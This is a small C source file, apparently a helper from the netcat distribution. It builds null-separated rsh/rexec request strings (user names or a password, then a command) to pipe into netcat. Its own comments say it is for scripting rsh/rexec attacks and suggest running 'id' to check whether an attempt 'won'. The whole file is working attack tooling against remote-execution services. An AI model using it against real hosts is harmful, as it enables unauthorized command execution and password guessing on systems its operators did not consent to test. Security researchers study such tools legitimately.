/* generate ^@string1^@string2^@cmd^@ input to netcat, for scripting up
   rsh/rexec attacks.  Needs to be a prog because shells strip out nulls.

   args:
        locuser remuser [cmd]
        remuser passwd [cmd]

   cmd defaults to "pwd".

   ... whatever.  _H*/

#include <stdio.h>

/* change if you like; "id" is a good one for figuring out if you won too */
static char cmd[] = "pwd";

static char buf [4096];

main(argc, argv)
int argc;
char * argv[];
{
	register int x;
	register int y;
	char * p;
	char * q;

	p = buf;
	memset(buf, 0, sizeof(buf));

	p++;                    /* first null */
	y = 1;

	if (!argv[1])
		goto wrong;
	strncpy(p, argv[1], sizeof(buf) - y); /* first arg plus another null */
	x = strlen(argv[1]) + 1;
	p += x;
	y += x;
	if (y >= sizeof(buf))
		goto over;

	if (!argv[2])
		goto wrong;
	strncpy(p, argv[2], sizeof(buf) - y);   /* second arg plus null */
	x = strlen(argv[2]) + 1;
	p += x;
	y += x;
	if (y >= sizeof(buf))
		goto over;

	q = cmd;
	if (argv[3])
		q = argv[3];
	strncpy(p, q, sizeof(buf) - y); /* the command, plus final null */
	x = strlen(q) + 1;
	p += x;
	y += x;
	if (y >= sizeof(buf))
		goto over;

	strncpy(p, "\n", sizeof(buf) - y); /* and a newline, so it goes */
	y++;

	write(1, buf, y);       /* zot! */
	exit(0);

wrong:
	fprintf(stderr, "wrong!  needs 2 or more args.\n");
	exit(1);

over:
	fprintf(stderr, "out of memory!\n");
	exit(1);
}
